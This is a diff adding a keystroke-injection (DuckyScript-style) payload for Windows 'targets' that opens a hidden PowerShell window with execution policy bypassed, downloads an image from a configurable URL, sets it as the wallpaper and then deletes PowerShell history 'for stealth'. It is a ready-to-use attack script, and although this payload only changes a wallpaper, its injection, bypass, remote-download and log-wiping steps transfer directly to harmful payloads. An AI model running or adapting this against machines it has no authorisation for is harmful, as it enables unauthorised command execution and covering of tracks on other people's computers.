@@ -1,0 +1,69 @@
+REM ================================================================
+REM HexScripts Wallpaper Changer Payload
+REM Mercenary-grade wallpaper deployment for Windows targets
+REM Compatible with Windows 10/11 - Payload Studio ready
+REM ================================================================
+REM 
+REM REQUIRED CONFIGURATION:
+REM - IMAGE_URL: Direct link to your wallpaper image (jpg/png/bmp)
+REM - HOST_DOMAIN: Your payload hosting domain
+REM 
+REM OPTIONAL CONFIGURATION:
+REM - INITIAL_DELAY: Adjust based on target boot time
+REM - EXECUTION_DELAY: Fine-tune for slower systems
+REM - IMAGE_NAME: Customize downloaded file name
+REM 
+REM HOSTING REQUIREMENTS:
+REM - Host your wallpaper image on a reliable CDN or web server
+REM - Ensure direct download links (no redirects or auth required)
+REM - Test image accessibility before deployment
+REM ================================================================
+
+REM Define configurable parameters - HexMod style placeholders
+DEFINE #IMAGE_URL https://example.com/wallpaper.jpg
+DEFINE #IMAGE_NAME wallpaper.jpg
+DEFINE #INITIAL_DELAY 3000
+DEFINE #EXECUTION_DELAY 500
+DEFINE #POWERSHELL_DELAY 2000
+
+REM Initial system delay for target readiness
+DELAY #INITIAL_DELAY
+
+REM Launch PowerShell with execution policy bypass
+GUI r
+DELAY #EXECUTION_DELAY
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY #POWERSHELL_DELAY
+
+REM Download and set wallpaper payload
+STRING try {
+ENTER
+STRING $imagePath = "$env:USERPROFILE\Pictures\#IMAGE_NAME"
+ENTER
+STRING Invoke-WebRequest -Uri "#IMAGE_URL" -OutFile $imagePath -UseBasicParsing
+ENTER
+STRING Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport("user32.dll", SetLastError = true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'
+ENTER
+STRING [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)
+ENTER
+STRING Write-Host "Wallpaper Attack deployed successfully"
+ENTER
+STRING } catch {
+ENTER
+STRING Write-Host "Deployment failed: $_"
+ENTER
+STRING }
+ENTER
+
+REM Exit PowerShell cleanly
+DELAY 1000
+STRING exit
+ENTER
+
+REM Clear PowerShell history for stealth
+DELAY 500
+GUI r
+DELAY #EXECUTION_DELAY
+STRING powershell -WindowStyle Hidden -Command "Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
+ENTER
